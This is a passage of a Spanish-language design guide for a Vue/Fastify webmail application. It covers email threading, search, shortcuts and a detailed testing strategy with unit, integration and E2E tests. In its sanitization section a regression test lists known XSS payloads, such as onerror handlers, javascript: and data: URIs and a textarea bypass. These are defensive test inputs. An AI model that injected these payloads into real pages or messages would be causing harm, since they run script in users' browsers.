    document.documentElement.classList.toggle('dark', dark);
  }, { immediate: true });

  return { isDark, theme: computed(() => store.theme) };
}
```

```typescript
// packages/api/src/services/threading.ts
// Algoritmo JWZ para agrupación de conversaciones
export class ThreadingService {
  static groupByThread(emails: EmailDoc[]): Map<string, EmailDoc[]> {
    const containers = new Map<string, Container>();

    for (const email of emails) {
      const msgId = email.messageId;
      let container = containers.get(msgId);
      if (!container) {
        container = { id: msgId, message: email, parent: null, children: [] };
        containers.set(msgId, container);
      } else if (!container.message) {
        container.message = email;
      }

      // Procesar In-Reply-To
      const parentId = email.headers?.['in-reply-to']?.[0]?.replace(/[<>]/g, '');
      if (parentId) {
        let parent = containers.get(parentId);
        if (!parent) {
          parent = { id: parentId, message: null, parent: null, children: [] };
          containers.set(parentId, parent);
        }
        container.parent = parent;
        parent.children.push(container);
      }

      // Procesar References
      const refs = email.headers?.['references']?.[0]?.split(/\s+/) || [];
      for (const ref of refs) {
        const cleanRef = ref.replace(/[<>]/g, '');
        let refContainer = containers.get(cleanRef);
        if (!refContainer) {
          refContainer = { id: cleanRef, message: null, parent: null, children: [] };
          containers.set(cleanRef, refContainer);
        }
        if (refContainer !== container.parent && !container.children.includes(refContainer)) {
          // Prune re-parenting según JWZ
        }
      }
    }

    // Agrupar por threadId
    const threads = new Map<string, EmailDoc[]>();
    for (const email of emails) {
      const tid = email.threadId;
      if (!threads.has(tid)) threads.set(tid, []);
      threads.get(tid)!.push(email);
    }
    return threads;
  }
}
```

```typescript
// packages/api/src/routes/search.ts
import { Email } from '../models/Email.js';

export async function searchRoutes(fastify: FastifyInstance) {
  fastify.get('/', async (req, reply) => {
    const { q, accountId, folderId, dateFrom, dateTo, hasAttachments } = req.query as any;

    // Atlas Search aggregation
    const pipeline: any[] = [
      {
        $search: {
          index: 'email_search',
          compound: {
            must: [
              { text: { query: q, path: ['subject', 'bodyText', 'from.address'], fuzzy: { maxEdits: 1 } } },
            ],
            filter: [
              { equals: { path: 'accountId', value: new ObjectId(accountId) } },
            ],
          },
        },
      },
      { $sort: { date: -1 } },
      { $limit: 50 },
      {
        $project: {
          subject: 1, from: 1, date: 1, isRead: 1, threadId: 1,
          highlights: { $meta: 'searchHighlights' },
          score: { $meta: 'searchScore' },
        },
      },
    ];

    if (folderId) {
      pipeline[0].$search.compound.filter.push(
        { equals: { path: 'folderId', value: new ObjectId(folderId) } }
      );
    }

    return Email.aggregate(pipeline);
  });
}
```

**Atajos de teclado configurados:**

| Atajo | Acción | Contexto |
|-------|--------|----------|
| `g` then `i` | Ir a INBOX | Global |
| `c` | Redactar nuevo email | Global |
| `r` | Responder email seleccionado | Vista lectura |
| `f` | Reenviar | Vista lectura |
| `e` | Archivar | Lista emails |
| `*` then `a` | Seleccionar todos | Lista emails |
| `j` / `k` | Navegar siguiente/anterior | Lista emails |
| `?` | Mostrar atajos | Global |
| `Esc` | Cerrar modal/vista | Global |

**Validación final:** Lighthouse score > 90 en performance, accesibilidad y best practices. Coverage de tests > 85%. Todos los contenedores saludables.


---

# 12. Testing Estratégico

El testing de una aplicación de correo presenta desafíos únicos: parsing MIME, sanitización HTML contra XSS, comunicación con servidores IMAP/SMTP y flujos E2E que atraviesan desde el frontend hasta servidores de correo reales. Este capítulo define la estrategia de testing completa para Webmail 6.0, basada en la pirámide de testing con proporción 70/20/10 [^295^].

## 12.1 Testing Unitario (Vitest)

Vitest es el framework de testing nativo para el ecosistema Vite/Vue 3, ofreciendo soporte integrado de TypeScript, hot module replacement para tests y compatibilidad con la API de Jest [^287^] [^303^]. La configuración base del monorepo ejecuta Vitest en cada package con `@vitest/coverage-v8` para reportes de cobertura.

```typescript
// packages/web/vitest.config.ts
import { defineConfig } from 'vitest/config';
import vue from '@vitejs/plugin-vue';
import { resolve } from 'path';

export default defineConfig({
  plugins: [vue()],
  test: {
    globals: true,
    environment: 'happy-dom',
    include: ['src/**/*.test.ts', 'src/**/*.spec.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'json-summary', 'html'],
      reportsDirectory: './coverage',
      thresholds: {
        lines: 85,
        functions: 85,
        branches: 80,
        statements: 85,
      },
      exclude: [
        'node_modules/',
        'src/**/*.d.ts',
        'src/**/types.ts',
        'src/main.ts',
        'src/router.ts',
        'coverage/**',
      ],
    },
  },
  resolve: {
    alias: {
      '@': resolve(__dirname, './src'),
    },
  },
});
```

```typescript
// packages/api/vitest.config.ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
    pool: 'forks', // Requerido para Testcontainers [^301^]
    include: ['src/**/*.test.ts', 'src/**/*.spec.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'json-summary', 'html'],
      reportsDirectory: './coverage',
      thresholds: {
        lines: 85,
        functions: 85,
        branches: 80,
        statements: 85,
      },
    },
    setupFiles: ['./test/setup.ts'],
  },
});
```

### 12.1.1 Frontend: mount() y withSetup para Composables

Los componentes Vue 3 que usan `<script setup>` y la Composition API se testean mediante `@vue/test-utils` y su función `mount()`. Para composables que dependen de hooks del ciclo de vida como `onMounted` o `onBeforeMount`, se requiere un helper `withSetup` que los ejecute dentro de un contexto de componente [^298^] [^296^].

```typescript
// packages/web/test/utils.ts
import { createApp, nextTick } from 'vue';
import { createPinia, setActivePinia } from 'pinia';

/**
 * Helper para testear composables que usan hooks de ciclo de vida.
 * Crea una app Vue temporal, monta el composable y retorna el resultado
 * junto con la instancia de app para limpieza.
 */
export function withSetup<T>(hook: () => T): [T, ReturnType<typeof createApp>] {
  let result!: T;
  const app = createApp({
    setup() {
      result = hook();
      return () => {};
    },
  });
  setActivePinia(createPinia());
  app.mount(document.createElement('div'));
  return [result, app];
}
```

**Ejemplo de test para un componente de lista de emails:**

```typescript
// packages/web/src/components/__tests__/VirtualEmailList.spec.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { mount } from '@vue/test-utils';
import { createPinia, setActivePinia } from 'pinia';
import VirtualEmailList from '../VirtualEmailList.vue';

describe('VirtualEmailList', () => {
  const mockEmails = Array.from({ length: 20 }, (_, i) => ({
    id: `email-${i}`,
    subject: `Asunto ${i}`,
    from: [{ name: `Remitente ${i}`, address: `user${i}@test.com` }],
    date: new Date(2026, 0, i + 1).toISOString(),
    isRead: i % 2 === 0,
    isStarred: i === 0,
    preview: `Vista previa del correo número ${i}...`,
  }));

  beforeEach(() => {
    setActivePinia(createPinia());
  });

  it('renderiza el contenedor con altura virtual correcta', () => {
    const wrapper = mount(VirtualEmailList, {
      props: {
        emails: mockEmails,
        selected: new Set(),
        total: 100,
      },
    });

    const inner = wrapper.find('[style*="position: relative"]');
    expect(inner.exists()).toBe(true);
    // 100 items * 80px por item = 8000px
    expect(inner.attributes('style')).toContain('height: 8000px');
  });

  it('emite evento select-one al hacer click en un email', async () => {
    const wrapper = mount(VirtualEmailList, {
      props: {
        emails: mockEmails,
        selected: new Set(),
        total: 20,
      },
      attachTo: document.body,
    });

    const firstEmail = wrapper.findAll('[class*="cursor-pointer"]').at(0);
    await firstEmail?.trigger('click');

    expect(wrapper.emitted('select-one')).toBeTruthy();
    expect(wrapper.emitted('select-one')![0]).toEqual(['email-0']);
  });

  it('renderiza solo los emails visibles en el viewport', () => {
    const wrapper = mount(VirtualEmailList, {
      props: {
        emails: mockEmails,
        selected: new Set(),
        total: 100,
      },
      attachTo: document.body,
    });

    // El container simula 800px de alto, con overscan de 5
    // Debería renderizar ~15 items (10 visibles + 5 overscan)
    const items = wrapper.findAll('[class*="cursor-pointer"]');
    expect(items.length).toBeLessThanOrEqual(16);
    expect(items.length).toBeGreaterThan(0);
  });

  it('muestra estado de no leído con font-semibold', () => {
    const wrapper = mount(VirtualEmailList, {
      props: {
        emails: mockEmails,
        selected: new Set(),
        total: 20,
      },
    });

    const items = wrapper.findAll('[class*="cursor-pointer"]');
    // El primer email (index 0) es isRead=true
    expect(items[0].classes()).not.toContain('font-semibold');
    // El segundo email (index 1) es isRead=false
    expect(items[1].classes()).toContain('font-semibold');
  });
});
```

**Ejemplo de test para composable de autenticación:**

```typescript
// packages/web/src/composables/__tests__/useAuth.spec.ts
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { ref, nextTick } from 'vue';
import { withSetup } from '../../../test/utils';
import { useAuthStore } from '../../stores/auth';
import { api } from '../../lib/api';

// Mock del módulo API
vi.mock('../../lib/api', () => ({
  api: {
    post: vi.fn(),
    defaults: { headers: { common: {} } },
  },
}));

describe('useAuthStore', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  it('inicia con estado no autenticado', () => {
    const [store, app] = withSetup(() => useAuthStore());
    expect(store.isAuthenticated).toBe(false);
    expect(store.user).toBeNull();
    app.unmount();
  });

  it('login almacena accessToken y configura header', async () => {
    const mockResponse = {
      data: {
        accessToken: 'test-token-123',
        user: { id: '1', username: 'testuser' },
      },
    };
    vi.mocked(api.post).mockResolvedValueOnce(mockResponse);

    const [store, app] = withSetup(() => useAuthStore());
    await store.login('testuser', 'password123');

    expect(store.accessToken).toBe('test-token-123');
    expect(store.isAuthenticated).toBe(true);
    expect(store.user?.username).toBe('testuser');
    expect(api.defaults.headers.common['Authorization']).toBe('Bearer test-token-123');
    app.unmount();
  });

  it('logout limpia estado y headers', async () => {
    vi.mocked(api.post).mockResolvedValueOnce({});

    const [store, app] = withSetup(() => useAuthStore());
    store.accessToken.value = 'existing-token';
    await store.logout();

    expect(store.accessToken).toBeNull();
    expect(store.isAuthenticated).toBe(false);
    expect(api.defaults.headers.common['Authorization']).toBeUndefined();
    app.unmount();
  });

  it('refresh automático se programa al hacer login', async () => {
    const loginResponse = {
      data: { accessToken: 'token-v1', user: { id: '1', username: 'u' } },
    };
    const refreshResponse = {
      data: { accessToken: 'token-v2' },
    };
    vi.mocked(api.post)
      .mockResolvedValueOnce(loginResponse)
      .mockResolvedValueOnce(refreshResponse);

    const [store, app] = withSetup(() => useAuthStore());
    await store.login('user', 'pass');

    // Avanzar 10 minutos para disparar el refresh
    vi.advanceTimersByTime(10 * 60 * 1000);
    await nextTick();

    expect(api.post).toHaveBeenCalledWith(
      '/auth/refresh',
      {},
      { withCredentials: true }
    );
    expect(store.accessToken).toBe('token-v2');
    app.unmount();
  });
});
```

### 12.1.2 Backend: Inyección de Dependencias y Mocks

Los tests unitarios del backend siguen el principio de inyección de dependencias, permitiendo sustituir implementaciones reales por mocks controlados. Para librerías externas como imapflow y Nodemailer, se utilizan mocks de módulo de Vitest [^297^].

```typescript
// packages/api/src/services/__tests__/auth.spec.ts
import { describe, it, expect, vi } from 'vitest';
import { AuthService } from '../auth';

// Mock de redis
vi.mock('../../config/redis', () => ({
  redis: {
    setex: vi.fn().mockResolvedValue('OK'),
    get: vi.fn(),
    del: vi.fn().mockResolvedValue(1),
  },
}));

describe('AuthService', () => {
  describe('encryptCredentials', () => {
    it('encripta y puede desencriptar credenciales correctamente', () => {
      const plain = 'password123!@#';
      const encrypted = AuthService.encryptCredentials(plain);

      expect(encrypted.ciphertext).toBeDefined();
      expect(encrypted.iv).toBeDefined();
      expect(encrypted.tag).toBeDefined();
      expect(encrypted.ciphertext).not.toBe(plain);

      const decrypted = AuthService.decryptCredentials(
        encrypted.ciphertext,
        encrypted.iv,
        encrypted.tag
      );
      expect(decrypted).toBe(plain);
    });

    it('produce diferentes ciphertexts para la misma entrada (IV aleatorio)', () => {
      const plain = 'same-password';
      const e1 = AuthService.encryptCredentials(plain);
      const e2 = AuthService.encryptCredentials(plain);

      expect(e1.ciphertext).not.toBe(e2.ciphertext);
      expect(e1.iv).not.toBe(e2.iv);
    });
  });

  describe('createRefreshToken', () => {
    it('almacena token en Redis con TTL de 7 días', async () => {
      const { redis } = await import('../../config/redis');
      const token = await AuthService.createRefreshToken('user-123');

      expect(token).toHaveLength(64); // 32 bytes hex = 64 chars
      expect(redis.setex).toHaveBeenCalledWith(
        expect.stringMatching(/^refresh:[a-f0-9]{64}$/),
        604800, // 7 * 24 * 3600
        expect.stringContaining('"userId":"user-123"')
      );
    });
  });

  describe('validateRefreshToken', () => {
    it('retorna datos y elimina token (one-time use)', async () => {
      const { redis } = await import('../../config/redis');
      const mockData = JSON.stringify({ userId: 'user-123', family: 'fam-abc' });
      vi.mocked(redis.get).mockResolvedValue(mockData);

      const result = await AuthService.validateRefreshToken('token-id-456');

      expect(result).toEqual({ userId: 'user-123', family: 'fam-abc' });
      expect(redis.del).toHaveBeenCalledWith('refresh:token-id-456');
    });

    it('retorna null para token inexistente', async () => {
      const { redis } = await import('../../config/redis');
      vi.mocked(redis.get).mockResolvedValue(null);

      const result = await AuthService.validateRefreshToken('nonexistent');
      expect(result).toBeNull();
    });
  });
});
```

```typescript
// packages/api/src/services/__tests__/smtp.spec.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SmtpService } from '../smtp';
import nodemailer from 'nodemailer';

vi.mock('nodemailer', async () => {
  const actual = await vi.importActual<typeof import('nodemailer')>('nodemailer');
  return {
    ...actual,
    default: {
      createTransport: vi.fn().mockReturnValue({
        sendMail: vi.fn().mockResolvedValue({ messageId: '<test-msg-id>' }),
      }),
    },
  };
});

describe('SmtpService', () => {
  const mockAccount = {
    _id: { toString: () => 'acc-1' } as any,
    email: 'user@example.com',
    smtpHost: 'smtp.example.com',
    smtpPort: 587,
    smtpSecure: false,
    displayName: 'Test User',
    credentialsEncrypted: 'cipher',
    credentialsIv: 'iv123',
    credentialsTag: 'tag123',
    get: vi.fn(),
  } as unknown as AccountDoc;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('crea transporter con configuración correcta', async () => {
    const service = new SmtpService();
    // Mock decryptCredentials para retornar JSON de credenciales
    vi.spyOn(AuthService, 'decryptCredentials').mockReturnValue('{"password":"secret"}');

    await service.getTransporter(mockAccount);

    expect(nodemailer.createTransport).toHaveBeenCalledWith(
      expect.objectContaining({
        pool: true,
        host: 'smtp.example.com',
        port: 587,
        secure: false,
        maxConnections: 3,
        maxMessages: 100,
      })
    );
  });

  it('envía email y retorna messageId', async () => {
    const service = new SmtpService();
    vi.spyOn(AuthService, 'decryptCredentials').mockReturnValue('{"password":"secret"}');

    const msgId = await service.sendEmail(mockAccount, {
      to: ['recipient@example.com'],
      subject: 'Test Subject',
      text: 'Plain text body',
      html: '<p>HTML body</p>',
    });

    expect(msgId).toBe('<test-msg-id>');
  });
});
```

### 12.1.3 Sanitización: Regresión XSS con Payloads Conocidos

La sanitización HTML es la línea de defensa crítica contra ataques XSS vía correo electrónico. Dado el historial de vulnerabilidades en DOMPurify, incluyendo CVE-2025-15599 [^281^] [^282^], se mantiene una suite de regresión con payloads conocidos.

```typescript
// packages/api/src/services/__tests__/sanitize.spec.ts
import { describe, it, expect } from 'vitest';
import sanitizeHtml from 'sanitize-html';

// Payloads de ataque XSS conocidos
const XSS_PAYLOADS = [
  {
    name: 'script tag básico',
    input: '<script>alert("xss")</script><p>legitimo</p>',
    allowedTags: ['p'],
  },
  {
    name: 'img onerror',
    input: '<img src=x onerror="alert(\'xss\')">',
    allowedTags: ['img'],
  },
  {
    name: 'javascript: protocol',
    input: '<a href="javascript:alert(\'xss\')">click</a>',
    allowedTags: ['a'],
  },
  {
    name: 'SVG onload',
    input: '<svg onload="alert(\'xss\')">',
    allowedTags: ['svg'],
  },
  {
    name: 'CVE-2025-15599 textarea bypass',
    input: '<textarea><img src=x onerror=alert(1)>',
    allowedTags: ['textarea', 'img'],
  },
  {
    name: 'nested event handlers',
    input: '<div onclick="alert(1)" onmouseover="alert(2)">text</div>',
    allowedTags: ['div'],
  },
  {
    name: 'data: URI execution',
    input: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">click</a>',
    allowedTags: ['a'],
  },
  {
    name: 'style expression (legacy IE)',
    input: '<div style="background-image: url(javascript:alert(1))">text</div>',
    allowedTags: ['div'],
  },
  {
    name: 'HTML entities en event handlers',
    input: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
    allowedTags: ['img'],
  },
  {
    name: 'template injection',
    input: '<template><script>alert(1)</script></template>',
    allowedTags: ['template'],
  },
];

describe('Sanitización HTML - Regresión XSS', () => {
  XSS_PAYLOADS.forEach(({ name, input }) => {
    it(`elimina vectores XSS: ${name}`, () => {
      const result = sanitizeHtml(input, {
        allowedTags: [
          'p', 'br', 'strong', 'em', 'u', 'a', 'img', 'table', 'tr', 'td', 'th',
          'thead', 'tbody', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
          'blockquote', 'pre', 'code', 'span', 'div',
        ],
        allowedAttributes: {
          a: ['href', 'title'],
          img: ['src', 'alt', 'width', 'height'],
          '*': ['style'],
        },
        allowedSchemes: ['http', 'https', 'mailto'],
      });

      expect(result).not.toMatch(/<script\b[^>]*>/i);
      expect(result).not.toMatch(/on\w+\s*=/i);
      expect(result).not.toMatch(/javascript:/i);
      expect(result).not.toMatch(/data:text\/html/i);
    });
  });

  it('preserva contenido legítimo después de sanitizar', () => {
    const input = '<p>Hola <strong>mundo</strong></p><script>alert(1)</script>';
    const result = sanitizeHtml(input, {
      allowedTags: ['p', 'strong'],
      allowedAttributes: {},
    });
    expect(result).toBe('<p>Hola <strong>mundo</strong></p>');
  });

  it('permite links https válidos', () => {
    const input = '<a href="https://example.com">Link</a>';
    const result = sanitizeHtml(input, {
      allowedTags: ['a'],
      allowedAttributes: { a: ['href'] },
      allowedSchemes: ['https'],
    });
    expect(result).toContain('href="https://example.com"');
  });
});
```

## 12.2 Testing de Integración (Fastify.inject + Testcontainers)

Los tests de integración validan que los componentes del backend funcionen correctamente en conjunto, incluyendo acceso a bases de datos reales y endpoints HTTP. `fastify.inject` es la herramienta nativa de Fastify que bypassa la capa HTTP/TCP, ofreciendo 2-5x más velocidad que supertest [^321^].

### 12.2.1 fastify.inject para API

```typescript
// packages/api/test/setup.ts
import { beforeAll, afterAll } from 'vitest';
import { MongoDBContainer } from '@testcontainers/mongodb';
import { RedisContainer } from '@testcontainers/redis';
import { buildApp } from '../src/app';

let mongoContainer: MongoDBContainer;
let redisContainer: RedisContainer;

export const setupTestEnv = async () => {
  mongoContainer = await new MongoDBContainer('mongo:7.0.16').start();
  redisContainer = await new RedisContainer('redis:7.4-alpine').start();

  process.env.MONGODB_URI = mongoContainer.getConnectionString();
  process.env.REDIS_URL = redisContainer.getConnectionUrl();
  process.env.JWT_SECRET = 'test-secret-key-32-bytes-long!!';
  process.env.ENCRYPTION_KEY = 'a'.repeat(64);

  const app = await buildApp();
  return { app, mongoContainer, redisContainer };
};
```

```typescript
// packages/api/src/routes/__tests__/auth.integration.spec.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { setupTestEnv } from '../../../test/setup';
import type { FastifyInstance } from 'fastify';

describe('Auth API Integration', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    const env = await setupTestEnv();
    app = env.app;
  });

  afterAll(async () => {
    await app.close();
  });

  it('POST /auth/register crea un nuevo usuario', async () => {
    const response = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/register',
      payload: {
        username: 'testuser',
        password: 'SecurePass123!',
      },
    });

    expect(response.statusCode).toBe(201);
    const body = JSON.parse(response.payload);
    expect(body.user.username).toBe('testuser');
    expect(body.user.passwordHash).toBeUndefined();
  });

  it('POST /auth/login retorna tokens válidos', async () => {
    // Primero registrar
    await app.inject({
      method: 'POST',
      url: '/api/v1/auth/register',
      payload: { username: 'logintest', password: 'SecurePass123!' },
    });

    const response = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { username: 'logintest', password: 'SecurePass123!' },
    });

    expect(response.statusCode).toBe(200);
    const body = JSON.parse(response.payload);
    expect(body.accessToken).toBeDefined();
    expect(typeof body.accessToken).toBe('string');
    expect(body.user.username).toBe('logintest');
  });

  it('POST /auth/login rechaza credenciales incorrectas', async () => {
    const response = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { username: 'nope', password: 'wrong' },
    });

    expect(response.statusCode).toBe(401);
    const body = JSON.parse(response.payload);
    expect(body.error).toContain('Invalid');
  });

  it('POST /auth/refresh rota el refresh token (one-time use)', async () => {
    // Login para obtener cookie de refresh
    await app.inject({
      method: 'POST',
      url: '/api/v1/auth/register',
      payload: { username: 'refreshuser', password: 'SecurePass123!' },
    });

    const loginRes = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { username: 'refreshuser', password: 'SecurePass123!' },
    });

    const setCookie = loginRes.headers['set-cookie'] as string;
    expect(setCookie).toBeDefined();

    // Primer refresh exitoso
    const refresh1 = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/refresh',
      headers: { cookie: setCookie },
    });
    expect(refresh1.statusCode).toBe(200);

    // Segundo refresh con mismo token debe fallar
    const refresh2 = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/refresh',
      headers: { cookie: setCookie },
    });
    expect(refresh2.statusCode).toBe(401);
  });

  it('POST /auth/logout invalida el refresh token', async () => {
    const loginRes = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { username: 'refreshuser', password: 'SecurePass123!' },
    });

    const setCookie = loginRes.headers['set-cookie'] as string;

    const logoutRes = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/logout',
      headers: { cookie: setCookie },
    });
    expect(logoutRes.statusCode).toBe(200);

    // Intentar refresh después de logout
    const refreshRes = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/refresh',
      headers: { cookie: setCookie },
    });
    expect(refreshRes.statusCode).toBe(401);
  });
});
```

### 12.2.2 Testcontainers para MongoDB y Redis

Testcontainers proporciona instancias reales de MongoDB y Redis en contenedores Docker durante los tests, eliminando las limitaciones de mongodb-memory-server con respecto a transacciones y change streams [^301^] [^267^].

```typescript
// packages/api/src/routes/__tests__/emails.integration.spec.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { setupTestEnv } from '../../../test/setup';
import { User } from '../../models/User';
import { Email } from '../../models/Email';
import mongoose from 'mongoose';
import type { FastifyInstance } from 'fastify';

describe('Emails API Integration', () => {
  let app: FastifyInstance;
  let authToken: string;
  let userId: string;
  let accountId: string;

  beforeAll(async () => {
    const env = await setupTestEnv();
    app = env.app;

    // Crear usuario y autenticar
    const regRes = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/register',
      payload: { username: 'emailtest', password: 'SecurePass123!' },
    });
    const regBody = JSON.parse(regRes.payload);
    authToken = regBody.accessToken;
    userId = regBody.user.id;

    // Crear cuenta de correo
    const accountRes = await app.inject({
      method: 'POST',
      url: '/api/v1/accounts',
      headers: { authorization: `Bearer ${authToken}` },
      payload: {
        email: 'test@example.com',
        provider: 'imap',
        imapHost: 'imap.example.com',
        imapPort: 993,
        password: 'app-password',
        displayName: 'Test Account',
      },
    });
    accountId = JSON.parse(accountRes.payload).account.id;

    // Seed de emails de prueba
    const folderId = new mongoose.Types.ObjectId();
    await Email.insertMany(
      Array.from({ length: 50 }, (_, i) => ({
        userId: new mongoose.Types.ObjectId(userId),
        accountId: new mongoose.Types.ObjectId(accountId),
        folderId,
        uid: i + 1,
        messageId: `<msg-${i}@example.com>`,
        threadId: i < 10 ? 'thread-1' : `thread-${i}`,
        subject: `Email de prueba ${i}`,
        from: [{ name: 'Sender', address: `sender${i}@test.com` }],
        to: [{ name: 'Test', address: 'test@example.com' }],
        date: new Date(2026, 0, i + 1),
        bodyText: `Contenido del email número ${i}`,
        isRead: i % 3 === 0,
        isStarred: i === 0,
        size: 1024 + i * 100,
      }))
    );
  });

  it('GET /api/v1/emails lista emails con paginación', async () => {
    const response = await app.inject({
      method: 'GET',
      url: `/api/v1/emails?accountId=${accountId}&limit=20`,
      headers: { authorization: `Bearer ${authToken}` },
    });

    expect(response.statusCode).toBe(200);
    const body = JSON.parse(response.payload);
    expect(body.emails).toHaveLength(20);
    expect(body.total).toBe(50);
    expect(body.emails[0]).toHaveProperty('subject');
    expect(body.emails[0]).toHaveProperty('from');
  });

  it('GET /api/v1/emails filtra por folder', async () => {
    const folderId = new mongoose.Types.ObjectId();
    await Email.create({
      userId: new mongoose.Types.ObjectId(userId),
      accountId: new mongoose.Types.ObjectId(accountId),
      folderId,
      uid: 999,
      messageId: '<other-folder-msg@example.com>',
      threadId: 'other-thread',
      subject: 'Email en otra carpeta',
      from: [{ name: 'Sender', address: 'sender@test.com' }],
      date: new Date(),
      bodyText: 'Contenido',
    });

    const response = await app.inject({
      method: 'GET',
      url: `/api/v1/emails?accountId=${accountId}&folderId=${folderId.toString()}`,
      headers: { authorization: `Bearer ${authToken}` },
    });

    expect(response.statusCode).toBe(200);
    const body = JSON.parse(response.payload);
    expect(body.emails).toHaveLength(1);
    expect(body.emails[0].subject).toBe('Email en otra carpeta');
  });

  it('GET /api/v1/emails ordena por fecha descendente', async () => {
    const response = await app.inject({
      method: 'GET',
      url: `/api/v1/emails?accountId=${accountId}&limit=5`,
      headers: { authorization: `Bearer ${authToken}` },
    });

    const body = JSON.parse(response.payload);
    const dates = body.emails.map((e: any) => new Date(e.date).getTime());
    for (let i = 1; i < dates.length; i++) {
      expect(dates[i - 1]).toBeGreaterThanOrEqual(dates[i]);
    }
  });

  it('PATCH /api/v1/emails/:id marca como leído', async () => {
    const email = await Email.findOne({ accountId, isRead: false });
    const response = await app.inject({
      method: 'PATCH',
      url: `/api/v1/emails/${email!._id}`,
      headers: { authorization: `Bearer ${authToken}` },
      payload: { isRead: true },
    });

    expect(response.statusCode).toBe(200);
    const updated = await Email.findById(email!._id);
    expect(updated!.isRead).toBe(true);
  });

  it('DELETE /api/v1/emails/:id elimina un email', async () => {
    const email = await Email.findOne({ accountId });
    const response = await app.inject({
      method: 'DELETE',
      url: `/api/v1/emails/${email!._id}`,
      headers: { authorization: `Bearer ${authToken}` },
    });

    expect(response.statusCode).toBe(204);
    const deleted = await Email.findById(email!._id);
    expect(deleted).toBeNull();
  });

  afterAll(async () => {
    await app.close();
  });
});
```

### 12.2.3 Mock IMAP/SMTP con Ethereal.email

Para tests que requieren protocolos IMAP y SMTP reales sin riesgo de envío, Ethereal.email proporciona un servicio SMTP/IMAP falso donde los correos nunca se entregan pero pueden verificarse vía IMAP [^300^] [^276^].

```typescript
// packages/api/src/services/__tests__/imap.integration.spec.ts
import { describe, it, expect } from 'vitest';
import nodemailer from 'nodemailer';
import { ImapFlow } from 'imapflow';
import PostalMime from 'postal-mime';

describe('IMAP/SMTP Integration con Ethereal.email', () => {
  it('envía email vía SMTP y lo recupera vía IMAP', async () => {
    // 1. Crear cuenta Ethereal
    const testAccount = await nodemailer.createTestAccount();

    // 2. Enviar email vía SMTP
    const transporter = nodemailer.createTransport({
      host: testAccount.smtp.host,
      port: testAccount.smtp.port,
      secure: testAccount.smtp.secure,
      auth: { user: testAccount.user, pass: testAccount.pass },
    });

    await transporter.sendMail({
      from: 'sender@example.com',
      to: 'recipient@example.com',
      subject: 'Test IMAP Integration',
      text: 'Este es el cuerpo en texto plano',
      html: '<p>Este es el cuerpo <strong>HTML</strong></p>',
    });

    // 3. Recuperar vía IMAP con imapflow
    const client = new ImapFlow({
      host: testAccount.imap.host,
      port: testAccount.imap.port,
      secure: testAccount.imap.secure,
      auth: { user: testAccount.user, pass: testAccount.pass },
      logger: false,
    });

    await client.connect();
    const lock = await client.getMailboxLock('INBOX');

    try {
      const messages = [];
      for await (const msg of client.fetch('1:*', { envelope: true, source: true })) {
        messages.push(msg);
      }

      expect(messages.length).toBeGreaterThanOrEqual(1);

      // 4. Parsear con PostalMime
      const latest = messages[messages.length - 1];
      const parsed = await PostalMime.parse(latest.source);

      expect(parsed.subject).toBe('Test IMAP Integration');
      expect(parsed.text).toContain('texto plano');
      expect(parsed.html).toContain('<strong>HTML</strong>');
    } finally {
      lock.release();
      await client.logout();
    }
  }, 30000); // Timeout 30s para operaciones IMAP
});
```

## 12.3 Testing E2E (Playwright)

Playwright es el framework de E2E recomendado para aplicaciones Vue.js en 2026, superando a Cypress en descargas npm, estrellas GitHub y ofertas de empleo [^261^]. Soporta ejecución paralela cross-browser, espera automática para reducir flaky tests y `APIRequestContext` para tests híbridos API+UI [^260^].

### 12.3.1 Flujos Críticos: Login, Compose, Enviar, Recibir

```typescript
// packages/web/e2e/auth.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Flujo de Autenticación', () => {
  test('login exitoso redirige a inbox', async ({ page }) => {
    await page.goto('/login');
    await page.fill('[data-testid="username"]', 'testuser');
    await page.fill('[data-testid="password"]', 'SecurePass123!');
    await page.click('[data-testid="login-button"]');

    await expect(page).toHaveURL('/inbox');
    await expect(page.locator('[data-testid="inbox-title"]')).toBeVisible();
  });

  test('login fallido muestra mensaje de error', async ({ page }) => {
    await page.goto('/login');
    await page.fill('[data-testid="username"]', 'wrong');
    await page.fill('[data-testid="password"]', 'wrong');
    await page.click('[data-testid="login-button"]');

    await expect(page.locator('[data-testid="login-error"]')).toBeVisible();
    await expect(page).toHaveURL('/login');
  });

  test('token expirado redirige a login', async ({ page, context }) => {
    // Simular token expirado inyectando uno inválido
    await context.addInitScript(() => {
      localStorage.setItem('accessToken', 'expired-token-xxx');
    });

    await page.goto('/inbox');

    // Debería redirigir a login cuando el API rechaza el token
    await expect(page).toHaveURL('/login', { timeout: 10000 });
  });
});
```

```typescript
// packages/web/e2e/compose.spec.ts
import { test, expect } from '@playwright/test';
import { createInbox, waitForEmail } from './helpers/mailslurp';

test.describe('Flujo de Redacción y Envío', () => {
  test('redactar y enviar email a inbox real', async ({ page }) => {
    // Crear inbox desechable para recibir el email
    const inbox = await createInbox();

    await page.goto('/compose');

    // Llenar campos del email
